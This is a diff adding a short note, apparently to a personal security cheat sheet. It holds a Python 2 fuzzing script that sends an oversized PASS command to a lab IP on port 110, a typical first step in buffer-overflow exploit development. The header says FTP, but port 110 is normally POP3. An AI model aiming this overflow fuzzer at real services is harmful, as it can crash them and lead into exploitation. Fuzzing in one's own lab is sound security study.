@@ -1,3 +1,26 @@
+Fuzzing an FTP server:
+
+```python
+#!/usr/bin/env python
+import socket
+
+ip = '10.11.25.149'
+port = 110
+
+buffer = "A" * 2700
+print "Fuzzing PASS with %s bytes" % len(buffer)
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((ip, port))
+
+s.recv(1024)
+s.send('USER test\r\n')
+s.recv(1024)
+s.send('PASS ' + buffer + '\r\n')
+s.send('QUIT\r\n')
+s.close()
+```
+
 Replace string occurrences in a binary file:
 
 ```python
